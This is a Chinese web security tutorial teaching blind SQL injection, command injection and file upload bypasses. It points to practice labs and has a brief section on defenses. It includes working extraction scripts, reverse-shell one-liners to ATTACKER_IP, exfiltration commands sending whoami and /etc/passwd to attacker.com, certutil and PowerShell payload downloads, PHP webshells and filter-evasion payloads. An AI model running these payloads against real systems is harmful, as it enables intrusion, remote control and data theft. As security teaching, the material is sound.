# Web 安全学习 — 教学内容汇总

> 以下内容按学习顺序追加，每次一个主题。笔记自己写，这里只负责教。

---

## 1. SQL 注入 — 布尔盲注（Boolean-based Blind SQLi）

### 什么时候需要布尔盲注？

联合注入和报错注入都有前提条件：

- 联合注入需要页面能**显示查询结果**（有回显位）
- 报错注入需要数据库**报错信息能输出到页面**

当这两个条件都不满足时 —— 页面只返回两种状态（"查询成功"和"查询失败"，或者两个不同的页面内容），就只能用布尔盲注。

### 核心思想

把任何想知道的数据库信息，**转化成一个"是/否"问题**，然后通过页面的两种不同响应来判断答案。

比如想知道当前数据库名的第一个字符是不是 `'a'`：

```sql
1' AND SUBSTR((SELECT database()), 1, 1) = 'a' -- 1
```

- 如果第一个字符确实是 `'a'`，整个 WHERE 条件为真，页面正常返回
- 如果不是 `'a'`，条件为假，页面异常（空结果或不同内容）

然后 `'a'` 到 `'z'` 逐个试，页面表现为"真"的那个字符就是答案。

### 关键函数

需要三个能力：截取子串、转成数字、比较。

| 操作 | MySQL/MariaDB | PostgreSQL | SQLite | MSSQL |
|------|--------------|------------|--------|-------|
| 截取第n个字符 | `SUBSTR(str, n, 1)` | `SUBSTR(str, n, 1)` | `SUBSTR(str, n, 1)` | `SUBSTRING(str, n, 1)` |
| 字符转ASCII | `ASCII(str)` | `ASCII(str)` | `UNICODE(str)` | `ASCII(str)` |
| 字符串长度 | `LENGTH(str)` | `LENGTH(str)` | `LENGTH(str)` | `LEN(str)` |

**实际中都使用 ASCII 数字比较**，原因：
- 绕过引号过滤（数字不需要引号）
- 数字比大小比字符串匹配更灵活，能用二分查找加速

```sql
-- 判断第一个字符的 ASCII 码是否大于 97（'a' = 97）
1' AND ASCII(SUBSTR((SELECT database()), 1, 1)) > 97 -- 1
```

### 完整的逐位爆破流程

#### 第一步：确定目标字符串的长度

```sql
1' AND LENGTH((SELECT database())) = 5 -- 1    -- 试试长度=5
1' AND LENGTH((SELECT database())) = 6 -- 1    -- 试试长度=6
1' AND LENGTH((SELECT database())) > 10 -- 1   -- 二分更快
```

先用二分确定长度范围，再精确确定。

#### 第二步：逐位爆破每个字符

```sql
-- 第1位，尝试 ASCII 115（'s'）
1' AND ASCII(SUBSTR((SELECT database()), 1, 1)) = 115 -- 1
-- 第1位不是 115，再试 113（'q'）... 直到匹配
```

#### 第三步：换目标，同方法

```sql
-- 爆第一张表名的第一个字符
1' AND ASCII(SUBSTR(
    (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)
, 1, 1)) = 117 -- 1
```

然后用 `LIMIT 1,1`、`LIMIT 2,1` 遍历下一个表名。

### 二分查找加速

线性搜索（`a-z` 逐个试）最坏要 26 次/字符。二分查找最多 **7 次/字符**。

ASCII 可打印字符范围大约 **32~126**（共 95 个），目标字符的 ASCII 一定在此区间内：

```
low = 32, high = 126
while low < high:
    mid = (low + high) // 2
    if ASCII(SUBSTR(target, pos, 1)) > mid:
        low = mid + 1     # 在右半区
    else:
        high = mid        # 在左半区（包含等于）
```

SQL 表达：

```sql
-- 猜 ASCII > 79？
1' AND ASCII(SUBSTR((SELECT database()), 1, 1)) > 79 -- 1
-- 真 → 在 80~126 之间，下一步猜 > 103
-- 假 → 在 32~80 之间，下一步猜 > 56
-- 持续缩小范围，直到 low == high
```

### Python 自动化脚本模板

手工逐个试不现实，盲注一定要写脚本：

```python
import requests

url = "http://target.com/vuln.php"
cookie = {"PHPSESSID": "xxx"}

def boolean_check(payload):
    """发送 payload，返回 True 表示条件为真"""
    params = {"id": payload}
    resp = requests.get(url, params=params, cookies=cookie)
    # 按实际情况选一种判断方式：
    # return "Welcome" in resp.text
    # return len(resp.text) > 100
    # return resp.status_code == 200
    return "success_message" in resp.text

def get_length(query):
    """二分法获取查询结果的长度"""
    low, high = 1, 50
    while low < high:
        mid = (low + high) // 2
        payload = f"1' AND LENGTH(({query})) > {mid} -- 1"
        if boolean_check(payload):
            low = mid + 1
        else:
            high = mid
    # 验证
    payload = f"1' AND LENGTH(({query})) = {low} -- 1"
    return low if boolean_check(payload) else 0

def get_string(query, length):
    """逐位二分法获取字符串"""
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"1' AND ASCII(SUBSTR(({query}), {i}, 1)) > {mid} -- 1"
            if boolean_check(payload):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"[+] 第{i}位: {chr(low)}  当前结果: {result}")
    return result

# 开始爆破
db_len = get_length("SELECT database()")
print(f"[*] 数据库名长度: {db_len}")
db_name = get_string("SELECT database()", db_len)
print(f"[+] 数据库名: {db_name}")
```

### 判断"真"和"假"的常见方式

这是最关键的一步——你必须先手动确认两种状态的差异：

```sql
1' AND 1=1 -- 1    -- 真：看页面长什么样
1' AND 1=2 -- 1    -- 假：看页面长什么样
```

常见差异类型：

1. **页面内容差异**：真→有 "Welcome" 字样；假→空白页或 "Not found"
2. **HTTP 状态码**：真→200，假→500 或 302
3. **页面长度显著不同**：`len(resp.text)` 有明显差异
4. **重定向**：真→正常页面，假→跳转到首页

### 绕过常见过滤

- **引号被过滤**：不写 `= 'a'`，用 `= 97`（ASCII 数字）或 `= CHAR(97)`
- **`SUBSTR` 被过滤**：换 `MID()`、`SUBSTRING()`、或者 `LEFT(RIGHT(str, n), 1)` 组合
- **空格被过滤**：用 `/**/`、`%0a`（换行）、`%0d`（回车）、括号替换（`ASCII(SUBSTR((query),1,1))` 本身能消掉很多空格）
- **逗号被过滤**：
    - `SUBSTR(str FROM n FOR 1)` 代替 `SUBSTR(str, n, 1)`
    - `LIMIT 1 OFFSET 0` 代替 `LIMIT 0,1`
- **等号被过滤**：用 `LIKE`、`REGEXP`、`>` `<` 组合、`BETWEEN`、`IN()`
- **大于号/小于号被过滤**：用 `BETWEEN`、`IN()`、`GREATEST()`/`LEAST()`、`NOT BETWEEN`

### 练习靶场

1. **Sqli-labs Less-5/6** — 经典布尔盲注入口
2. **PortSwigger Web Security Academy — Blind SQLi** 系列
3. 自己搭：PHP + MySQL，接收 `?id=`，有结果输出"用户存在"，没结果输出"用户不存在"

---

## 2. SQL 注入 — 时间盲注（Time-based Blind SQLi）

### 什么时候需要时间盲注？

比布尔盲注更绝望的情况：页面**完全不返回任何差异**。

- 不管查询是真是假，页面内容、状态码、长度完全一样
- 报错信息不显示
- 没有任何回显位

这时候你唯一能用的信道就是**时间** —— 让数据库在条件为真时"多等几秒"，用响应时间来判断。

### 核心思想

把布尔条件翻译成：
- 条件为真 → 执行 `SLEEP(5)` → 页面 5 秒后才返回
- 条件为假 → 不执行 `SLEEP()` → 页面立即返回

```sql
-- 如果 database() 的第一个字符是 'a'，延迟 5 秒
1' AND IF(SUBSTR((SELECT database()), 1, 1) = 'a', SLEEP(5), 0) -- 1
```

请求发出后计时，超过 5 秒 → 猜对了。

### 各数据库的延时函数

| 数据库 | 延时函数 | 说明 |
|--------|---------|------|
| MySQL/MariaDB | `SLEEP(n)` | 延迟 n 秒 |
| MySQL/MariaDB | `BENCHMARK(count, expr)` | 重复执行 expr 来消耗时间，能绕过 `SLEEP` 被禁 |
| PostgreSQL | `pg_sleep(n)` | 延迟 n 秒 |
| SQLite | `randomblob(n)` | `randomblob(100000000)` 生成大随机 blob，消耗时间 |
| SQLite | `likelihood(x, y)` 嵌套 | 构造繁重计算 |
| MSSQL | `WAITFOR DELAY '0:0:5'` | 延迟 5 秒 |
| Oracle | `DBMS_LOCK.SLEEP(n)` | 延迟 n 秒（需要权限） |

### MySQL/MariaDB 的时间盲注

**基本 payload：**

```sql
-- SLEEP 方式
1' AND IF(SUBSTR((SELECT database()), 1, 1) = 'a', SLEEP(5), 0) -- 1

-- 或者用 ASCII 数字比较（绕过引号）
1' AND IF(ASCII(SUBSTR((SELECT database()), 1, 1)) = 97, SLEEP(5), 0) -- 1
```

**`CASE WHEN` 写法（等价于 IF）：**

```sql
1' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT database()), 1, 1)) = 97) THEN SLEEP(5) ELSE 0 END) -- 1
```

**`AND` 短路写法：**

MySQL 里 `AND` 是短路的 —— 左边为假就不再算右边。可以利用这个来控制延时是否触发：

```sql
-- 先用 AND 判断条件，条件为真才走到 SLEEP
1' AND ASCII(SUBSTR((SELECT database()), 1, 1)) = 97 AND SLEEP(5) -- 1
```

这种方式更简洁，但如果 `SLEEP` 被过滤，就得换 `BENCHMARK`。

**`BENCHMARK` 替代 `SLEEP`：**

```sql
-- BENCHMARK(50000000, MD5('test')) 把 MD5('test') 执行 5000 万次
1' AND IF(ASCII(SUBSTR((SELECT database()), 1, 1)) = 97, BENCHMARK(50000000, MD5('test')), 0) -- 1
```

`BENCHMARK` 的计数值需要根据目标服务器性能调整，太低了延迟不明显，太高了可能把服务器打挂。

**还有更暴力的——笛卡尔积延时：**

```sql
-- 利用 information_schema 表做大量 JOIN，计算繁重
1' AND IF(ASCII(SUBSTR((SELECT database()), 1, 1)) = 97,
    (SELECT COUNT(*) FROM information_schema.columns A,
     information_schema.columns B,
     information_schema.columns C),
0) -- 1
```

这种方式纯粹靠大数据量计算来造延迟，绕过了所有延时函数的检测。

### PostgreSQL 的时间盲注

```sql
-- 基本形式
1' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT current_database()), 1, 1)) = 97)
    THEN pg_sleep(5) ELSE 0 END) -- 1

-- pg_sleep 也可以用在 SELECT 列表中
1' OR 1=1; SELECT pg_sleep(5) -- 1
```

### SQLite 的时间盲注

SQLite 没有原生延时函数，靠计算消耗：

```sql
-- randomblob 生成大体积随机数据
1' AND CASE WHEN (UNICODE(SUBSTR((SELECT sqlite_version()), 1, 1)) = 51)
    THEN randomblob(300000000) ELSE 0 END -- 1

-- LIKE 的某些模式也可以造成慢查询
```

### 时间盲注的完整爆破流程

和布尔盲注一样的步骤，只是判断方式从"页面内容"换成"响应时间"：

**第一步：确定长度**

```sql
1' AND IF(LENGTH((SELECT database())) = 8, SLEEP(3), 0) -- 1
-- 如果返回花了 3 秒以上 → 长度是 8
```

**第二步：逐位爆破**

```sql
1' AND IF(ASCII(SUBSTR((SELECT database()), 1, 1)) = 115, SLEEP(3), 0) -- 1
-- 延迟了 3 秒 → 第1位 ASCII 115 = 's'
```

**第三步：遍历行**

```sql
1' AND IF(ASCII(SUBSTR(
    (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)
, 1, 1)) = 117, SLEEP(3), 0) -- 1
```

### Python 自动化脚本

核心区别只在判断逻辑——测量响应时间：

```python
import requests
import time

url = "http://target.com/vuln.php"
cookie = {"PHPSESSID": "xxx"}
SLEEP_SECONDS = 3          # payload 里设的延时秒数
TIMEOUT = SLEEP_SECONDS + 2  # 请求超时，给点余量

def time_check(payload):
    """发送 payload，如果响应时间 >= SLEEP_SECONDS 则为真"""
    params = {"id": payload}
    start = time.time()
    try:
        resp = requests.get(url, params=params, cookies=cookie, timeout=TIMEOUT)
    except requests.Timeout:
        # 超时也算延时生效
        return True
    elapsed = time.time() - start
    return elapsed >= SLEEP_SECONDS

def get_length(query):
    """二分法确定长度"""
    low, high = 1, 50
    while low < high:
        mid = (low + high) // 2
        payload = f"1' AND IF(LENGTH(({query})) > {mid}, SLEEP({SLEEP_SECONDS}), 0) -- 1"
        if time_check(payload):
            low = mid + 1
        else:
            high = mid
    # 验证
    payload = f"1' AND IF(LENGTH(({query})) = {low}, SLEEP({SLEEP_SECONDS}), 0) -- 1"
    return low if time_check(payload) else 0

def get_string(query, length):
    """逐位二分法爆破字符串"""
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"1' AND IF(ASCII(SUBSTR(({query}), {i}, 1)) > {mid}, SLEEP({SLEEP_SECONDS}), 0) -- 1"
            if time_check(payload):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"[+] 第{i}位: {chr(low)}  当前结果: {result}")
    return result

# 开始爆破
db_len = get_length("SELECT database()")
print(f"[*] 数据库名长度: {db_len}")
db_name = get_string("SELECT database()", db_len)
print(f"[+] 数据库名: {db_name}")
```

### 时间盲注 vs 布尔盲注 的取舍

| 维度 | 布尔盲注 | 时间盲注 |
|------|---------|---------|
| 速度 | 快，一次请求判断一个条件 | 慢，每次"真"要多等 N 秒 |
| 网络波动影响 | 小，只看响应内容 | 大，网络延迟可能误判 |
| 适用场景 | 页面有二态差异 | 页面完全无差异 |
| 被检测风险 | 较低 | 较高（大量超时请求易触发告警） |

**一般优先级**：能用联合注入不报错 → 能用报错不盲注 → 能用布尔不用时间。

### 时间盲注特有的坑

1. **网络延迟干扰**：你的网络到目标本身有几十到几百毫秒延迟，加上波动——如果你设 `SLEEP(2)`，但网络偶尔卡了 2 秒，会误判。对策：把延时设大一点（3-5 秒），或者用多次请求取平均值/中位数
2. **请求并行问题**：不要并发请求，顺序执行，否则时间测量乱掉
3. **服务器限流/WAF**：大量长时间请求容易触发速率限制，适当加大请求间隔（`time.sleep(0.5)`）
4. **目标数据库负载**：`BENCHMARK` 和笛卡尔积重查询会真实消耗服务器资源，别在人家生产环境上跑
5. **`SLEEP` 被禁**：换 `BENCHMARK`（MySQL）、笛卡尔积重查询、将 `pg_sleep` 放 `SELECT` 子句中（PostgreSQL）

### 绕过时间盲注的防护

防护通常会过滤 `SLEEP`、`BENCHMARK`、`pg_sleep`、`WAITFOR`：

- MySQL：用笛卡尔积做繁重计算替代（见上文），或用 `GET_LOCK()` 构造等待
- PostgreSQL：用 `pg_sleep_until()` 代替 `pg_sleep()`，或者用 `generate_series()` 做大规模计算
- 通用：用 `CASE WHEN` 触发一个大表全表扫描

### 练习靶场

1. **Sqli-labs Less-9/10** — 经典时间盲注关
2. **PortSwigger Web Security Academy — Blind SQLi with time delays** 系列
3. 对比同一个目标，先用布尔盲注打一遍，再用时间盲注打一遍，感受速度差异

---

## 3. 命令注入（Command Injection）

### 什么是命令注入？

Web 应用调用了系统命令（`system()`、`exec()`、`popen()` 等），而用户输入被拼接进了命令字符串，导致攻击者可以注入额外的系统命令。

**典型脆弱代码：**

```php
<?php
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);
?>
```

用户输入 `127.0.0.1`，实际执行：`ping -c 3 127.0.0.1` —— 正常。
用户输入 `127.0.0.1; cat /etc/passwd`，实际执行：`ping -c 3 127.0.0.1; cat /etc/passwd` —— 命令注入。

### 常见注入点

只要用户输入被传给了系统命令，就可能是注入点：

- **网络工具**：ping、traceroute、nslookup、whois、curl/wget
- **系统管理**：备份脚本、日志查看、服务启停
- **文件操作**：图片处理（ImageMagick / Ghostscript）、压缩解压、文件转换（PDF/Office）
- **邮件发送**：`mail()` 的参数被拼接到 `sendmail` 命令
- **认证类**：LDAP 查询、系统级身份验证

### 命令拼接符大全

同一条 payload 在不同平台表现不同，你需要掌握哪些拼接符能隔开两条命令：

| 拼接符 | 示例 | Linux | Windows | 说明 |
|--------|------|-------|---------|------|
| `;` | `cmd1; cmd2` | ✅ | ❌ (cmd.exe)，✅ (powershell) | 顺序执行，前者失败不影响后者 |
| `\|` | `cmd1 \| cmd2` | ✅ | ✅ | 前者输出作为后者输入 |
| `\|\|` | `cmd1 \|\| cmd2` | ✅ | ✅ | 前者失败才执行后者 |
| `&&` | `cmd1 && cmd2` | ✅ | ✅ | 前者成功才执行后者 |
| `&` | `cmd1 & cmd2` | ✅ (后台) | ✅ (命令分隔) | Linux 下是后台运行，Windows 下等同 `&&` |
| 反引号 | `` `cmd` `` | ✅ | ❌ (cmd.exe) | 内联执行，输出替代原位置 |
| `$()` | `$(cmd)` | ✅ | ❌ (cmd.exe) | 同上，更现代的写法 |
| 换行符 `%0a` / `\n` | `cmd1%0acmd2` | ✅ | ❌ | URL 注入中常用 |

**实际中用的最多的三个**：`;`、`|`、`||`（Linux）；`|`、`||`、`&&`（Windows）。

### 基础的利用与探测

**第一步：判断是否存在注入**

```bash
# 先正常请求，记录响应（长度、时间）
127.0.0.1

# 加延时，观察响应时间
127.0.0.1; sleep 5       # Linux
127.0.0.1|ping -n 5 127.0.0.1   # Windows，ping 5次约4秒

# 加回显命令
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1|whoami        # Windows
```

**第二步：信息收集**

```bash
# 先搞清楚自己是谁、能做什么
; id
; whoami
; uname -a          # 系统版本
; pwd               # 当前目录
; ls -la            # 文件列表
; which nc          # 有哪些工具可用
; which python3
; cat /etc/passwd   # 查看用户列表
```

**第三步：搞 shell**

```bash
# 反弹 shell（最经典三板斧）
; bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'
; nc -e /bin/sh ATTACKER_IP PORT
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 或者直接写 WebShell 到 web 目录
; echo '<?php @eval($_POST["x"]);?>' > /var/www/html/shell.php
```

---

### 过滤绕过

现实中没有靶场那么干净，你要面对各种过滤。以下按维度逐个击破。

#### 1. 空格绕过

空格是最容易被过滤的字符，但替代方案非常多：

```bash
# $IFS — Linux shell 的内部字段分隔符，默认包含空格/Tab/换行
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# < 重定向（读文件时）
cat</etc/passwd
cat<>/etc/passwd

# {} 包裹
{cat,/etc/passwd}

# Tab %09
ping%09-c%091%09127.0.0.1

# 换行 %0a （本身也是命令分隔符）
cat%0a/etc/passwd

# 在 URL 里的技巧：不写空格，直接接参数
ping -c1 127.0.0.1;cat /etc/passwd
# → 
ping -c1 127.0.0.1;cat</etc/passwd
```

#### 2. 关键字（命令名）绕过

过滤了 `cat` 怎么读文件？

**大小写混写**（Windows 管用，Linux 不管用）：
```bash
# Windows cmd.exe 不区分大小写
DiR
TyPe
WhOaMi
```

**空变量/引号拆分**（Linux 管用）：
```bash
# 用单/双引号和空变量打断关键字
c''at /etc/passwd
c""at /etc/passwd
ca$()t /etc/passwd
ca${IFS}t /etc/passwd

# 反斜杠打断
c\at /etc/passwd
c\a\t /etc/passwd
```

**变量拼接**：
```bash
a=c;b=at;$a$b /etc/passwd
x=ca;y=t;${x}${y} /etc/passwd
```

**通配符**（`cat` 被禁就用别的工具名 + 通配符）：
```bash
# 当 /bin/cat 被屏蔽
/bin/c?t /etc/passwd      # ? 匹配单个字符
/bin/c* /etc/passwd       # * 匹配任意多个
```

**替代读取命令**：
```bash
cat     → tac / more / less / head / tail / nl / sort / rev / od / xxd / strings
        → dd if=/etc/passwd
        → while read line; do echo $line; done < /etc/passwd
```

#### 3. 分隔符绕过（`;` 被过滤）

```bash
# 换行符 — URL 里编码为 %0a
ping -c1 127.0.0.1%0awhoami

# 管道 — 输出干扰时用
ping -c1 127.0.0.1|whoami

# 反引号 / $() — 内联执行，不需要分隔
ping -c1 `whoami`.attacker.com      # DNS 带外
ping -c1 $(whoami).attacker.com
```

#### 4. 引号绕过

过滤了 `/`？用环境变量替代：

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
# ${HOME:0:1} = /
```

原理：`${HOME}` 的值是 `/home/user`，`${HOME:0:1}` 取第一个字符，得到 `/`。

#### 5. 通配符绕过文件名

```bash
# 文件路径有黑名单
cat /???/pass?d      # /etc/passwd
cat /etc/pass*       # /etc/passwd
cat /etc/pass[wW][dD] # 绕过大小写过滤
```

#### 6. 编码绕过

```bash
# Base64
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash

# Hex
echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# 八进制
echo $'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144' | bash
```

#### 7. 长度限制绕过

当输入长度被严格限制（比如只能输 10 个字符）：

```bash
# 先写简短的 wget 命令下载完整 payload
wget ATTACKER_IP/x
chmod +x x; ./x

# 或者用文件分批写入
echo '<?' > a
echo 'php' >> a
echo ' sy' >> a
echo 'stem' >> a
echo '($_G' >> a
echo 'ET["x' >> a
echo '"])' >> a
echo '?>' >> a
# 最后形成 a = <?php system($_GET["x"]);?>
```

---

### 盲命令注入

当命令执行了但没有回显时（类似时间盲注的思路）：

**方法一：时间延迟**

```bash
# Linux
; sleep 5
; sleep $(IFS$()5)    # 空格被过滤的版本

# Windows
| ping -n 5 127.0.0.1
```

通过响应时间判断命令是否执行了。

**方法二：带外数据外带（OOB）— 最常用**

```bash
# 把 whoami 的结果拼到你自己域名的子域名，然后看 DNS 日志
; nslookup $(whoami).attacker.com
; wget http://attacker.com/$(whoami)
; curl http://attacker.com/$(whoami)

# 多词结果的 exfil（比如读文件）
; curl http://attacker.com/$(cat /etc/passwd | base64)
```

用 Burp Collaborator、dnslog.cn、ceye.io 或者你自己的 VPS 接收。

**方法三：写入可访问路径**

```bash
; whoami > /var/www/html/out.txt
; cat /etc/passwd > /var/www/html/pass.txt
```

然后浏览器直接访问 `http://target.com/out.txt`，如果 web 目录可写的话。

**方法四：利用已有文件**

```bash
; cp /etc/passwd /var/www/html/pass.txt    # 复制到 web 目录
; mv /etc/passwd /var/www/html/pass.txt    # 移动（破坏性强慎用）
; ln -s /etc/passwd /var/www/html/pass     # 软链接
```

---

### Windows 特有的一些点

Windows 下的命令注入和 Linux 有以下关键差异：

```bash
# 拼接符
| dir         # 管道 OK
& dir         # 命令分隔 OK（注意 URL 里 & 也是参数分隔符，需 URL 编码 %26）
&& dir        # OK
|| whoami     # OK
; whoami      # cmd.exe 不识别，PowerShell 识别

# 读取文件
type C:\Windows\System32\drivers\etc\hosts

# 列目录
dir C:\
dir /B C:\    # 简洁模式

# 网络
ping -n 3 127.0.0.1
nslookup attacker.com
certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\temp\p.exe

# 反弹 shell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
```

---

### 实战常见的利用链

**1. 命令注入 + 文件上传 → WebShell**

有些上传点本身没有危险扩展名，但部署流程调用了系统命令（如 rename、convert、unzip）：

```bash
; mv /uploads/user.jpg /uploads/user.php     # 重命名为可执行文件
```

**2. OS command → reverse shell → 内网穿透**

```bash
; bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# 拿到 shell 后 frp / chisel 建立隧道打下一层
```

**3. 命令注入 + DNS 外带 → 确认注入后上大 payload**

先用 dnslog 确认注入存在，再做后续利用。

---

### 防范方案（开发视角）

- **不要拼**：能用 API/库就别调系统命令
- **如果必须调**：参数化传参，别拼字符串。很多语言的 `exec` 都有数组形式：
  ```java
  ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", userInput);
  ```
- **白名单**：对输入做严格白名单验证（IP 就只允许数字和点）
- **最小权限**：Web 进程不要跑 root；用 `disable_functions` 禁用 `system`/`exec`

---

### 练习靶场

1. **DVWA Command Injection** — low → medium → high，看看不同过滤级别对应哪些绕过
2. **PortSwigger Web Security Academy** — OS command injection 系列
3. **bWAPP** — OS Command Injection 系列
4. **自行搭建**：一个简单 ping 页面，自己加各种过滤再尝试绕过

---

## 4. 文件上传（File Upload）

### 漏洞的本质

文件上传漏洞不是"你传了一个文件"——而是**你传了一个能被服务器执行的代码文件**，然后去访问它，让它执行。

两个条件缺一不可：
1. 能把恶意文件传上去
2. 能通过 URL 访问到它，并且服务器会执行它

### 漏洞分类

按防御层次从浅到深排列，每个层次对应一种绕过思路：

```
前端 JS 校验  →  最简单，改请求即可
MIME Type     →  抓包改 Content-Type
文件扩展名     →  核心战场，最多花样
文件内容检查   →  图片马、幻数绕过
服务端解析     →  配置漏洞导致非脚本文件被当作脚本执行
```

---

### 第一层：前端 JS 校验绕过

特征是：选了非图片文件，浏览器直接弹"不允许的文件类型"，请求还没发出去。

**绕过方法**（一句话）：
- Burp 抓包 → 改后缀 → 放行。前端校验就是摆设。

或者直接在浏览器里：
- F12 去掉 `<input>` 的 `accept` 属性
- 把 JS 校验函数干掉

---

### 第二层：MIME Type（Content-Type）绕过

特征是：文件传上去了但是被拦截，抓包看到后端检查了 `Content-Type`。

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxxx
...
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php       ← 改成 image/jpeg
```

**绕过**：Burp 里把 `Content-Type` 从 `application/x-php` 改成 `image/jpeg` 或 `image/gif` 或 `image/png`。

---

### 第三层：文件扩展名绕过（核心战场）

这层是最多花样的，因为后端在这一步做的校验各不相同。

#### 3.1 黑名单绕过

**大小写混写**：
```
shell.PHP、shell.Php、shell.pHp
```
后端只过滤了 `.php` 但没处理大写，Windows 和某些 Linux 配置下大写也能执行。

**双扩展名**：
```
shell.php.jpg、shell.jpg.php
```
取决于服务器怎么解析：Apache 从右往左找，如果 `.jpg` 不解析继续往左找 `.php`。（NTFS 流也可以玩 `shell.php::$DATA`）

**空格 / 点截断**（Windows 专有）：
```
shell.php.     → Windows 把末尾点去掉，保存为 shell.php
shell.php      → 末尾空格同理
shell.php::$DATA  → NTFS 流截断
```

**%00 截断**（PHP < 5.3.4，magic_quotes_gpc = off）：
```
shell.php%00.jpg   → 后端到 %00 就截断了，后面 .jpg 被丢弃
shell.php .jpg     → 如果后端路径也算错
```

**少见的扩展名也危险**：

PHP 可能被配置成解析以下扩展名（取决于 `httpd.conf` 或 `.htaccess`）：
```
.php3  .php4  .php5  .phtml  .pht  .phar  .phps  .inc
```

ASP/ASP.NET：
```
.asp  .aspx  .asa  .cer  .cdx  .ashx  .asmx  .ascx
```

JSP：
```
.jsp  .jspx  .jspf  .jsw  .jsv
```

**绕过思路**：拿一个没被黑名单覆盖的危险扩展名去试。

#### 3.2 白名单绕过

白名单比黑名单安全得多，但也能绕：

**文件名构造**：在扩展名前面插入无害字符
```
shell.php;.jpg     → IIS6 解析 .php; 后面的 .jpg 被忽略
shell.php%00.jpg   → %00 截断
shell.php.jpg      → 配合 .htaccess 把 .jpg 当 PHP 执行
```

**Apache `.htaccess` 覆盖解析规则**：
```
上传 .htaccess，内容：
AddType application/x-httpd-php .jpg
```
然后所有 `.jpg` 都按 PHP 执行，你传一张图片马就变 WebShell。

**HTTPD / PHP-FPM 下的 `.user.ini`**：
```
上传 .user.ini，内容：
auto_prepend_file = "shell.jpg"
```
然后任何 PHP 文件执行前都会自动包含 `shell.jpg`。

#### 3.3 竞争条件

后端先把文件存到临时目录 → 做安全检查 → 不通过就删除。这个"存→检→删"中间有极短的窗口期。

写脚本高速并发请求上传+访问，在文件被删之前触碰到它：
```python
import threading
import requests

def upload():
    while True:
        r = requests.post(url, files={"file": ("shell.php", "<?php system($_GET['c']); ?>")})

def execute():
    while True:
        r = requests.get("http://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("[+] 命中!")

threading.Thread(target=upload).start()
threading.Thread(target=execute).start()
```

---

### 第四层：文件内容检查绕过

#### 4.1 文件幻数（Magic Bytes）

后端不仅看扩展名，还读了文件前几个字节。常见幻数：

| 文件类型 | 前几个十六进制字节 |
|---------|------------------|
| GIF | `GIF89a` 或 `GIF87a` |
| JPEG | `FF D8 FF E0` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| PDF | `%PDF` |
| ZIP | `PK` (`50 4B`) |

**绕过**：在 WebShell 前面加一行 `GIF89a`：

```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```

绝大多数文件内容检查只读前几个字节，后面的 PHP 代码不影响文件被当成 PHP 执行。

#### 4.2 `getimagesize()` 绕过

如果后端用 PHP 的 `getimagesize()` 检查，你得保证前面那些字节是一张合法的图片：

1. 找一张真正的 1x1 GIF/JPG
2. 在图片末尾追加 `<?php @eval($_POST['cmd']); ?>`
3. 保存为 `.php` 或配合解析漏洞

可以用工具：`exiftool` 往图片的 Comment 字段里插入 PHP 代码。

#### 4.3 二次渲染绕过

有些应用上传图片后会做裁剪/压缩（生成新文件），你注入的 PHP 代码在渲染后可能被洗掉。

**绕过思路**：找到渲染后不变化的位置。比如 GIF 的某些帧区域、JPEG 的元数据区。需要具体分析目标用的图片库（GD? ImageMagick?）。ImageMagick 甚至本身就有过 GhostScript 命令注入漏洞（ImageTragick）。

---

### 第五层：解析漏洞

文件本身不能被解析，但服务器配置错误让它被解析了。

**Apache 解析漏洞**：
```
shell.php.xxx.zzz
```
Apache 从右往左找已知扩展名，`.zzz` 不认识 → `.xxx` 不认识 → `.php` 认识 → 按 PHP 执行。

**IIS 6.0 解析漏洞**：
```
/upload/shell.asp;.jpg    → 分号截断，当 asp 执行
/upload/shell.asp/test.jpg → 目录名包含 .asp，目录下所有文件当 asp 执行
```

**Nginx 解析漏洞**：
Nginx + PHP-FPM，当 `cgi.fix_pathinfo=1`（默认）时：
```
/upload/shell.jpg/xxx.php   → Nginx 把 shell.jpg 交给 PHP-FPM 按 PHP 执行
```

**IIS 7/7.5 + PHP**：
```
/upload/shell.jpg/.php    → 类似 Nginx 原理
```

---

### WebShell 之外的文件上传利用

| 场景 | 利用方式 |
|------|---------|
| **覆盖关键文件** | 上传同名文件覆盖 `authorized_keys`、`web.config`、`.bashrc` |
| **符号链接** | 上传含 symlink 的压缩包，解压后指向 /etc/passwd |
| **zip slip** | 压缩包内文件名含 `../../../var/www/html/shell.php`，解压时路径穿越写 WebShell |
| **SVG XSS** | 上传 SVG（本质是 XML），内含 `<script>` 标签，访问时触发 XSS |
| **CSV 注入** | 上传含 `=cmd|' /C calc'!A0` 的 CSV，管理员用 Excel 打开时执行 |
| **客户端攻击** | 上传带病毒的 exe/脚本，诱导内部用户下载执行 |

---

### 无文件 Webshell / 内存马

